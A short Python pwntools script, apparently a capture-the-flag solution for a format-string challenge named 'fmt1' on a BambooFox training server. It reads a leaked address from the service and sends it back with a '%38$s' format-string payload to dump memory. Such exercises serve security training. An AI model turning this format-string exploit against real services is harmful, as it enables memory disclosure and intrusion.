
from pwn import *

# r = process('./fmt1')
r = remote('bamboofox.cs.nctu.edu.tw', 10104)

leak = int(r.recvline().split()[5][:-1],16)
r.sendline(p32(leak) + b'%38$s')
print(r.recv())
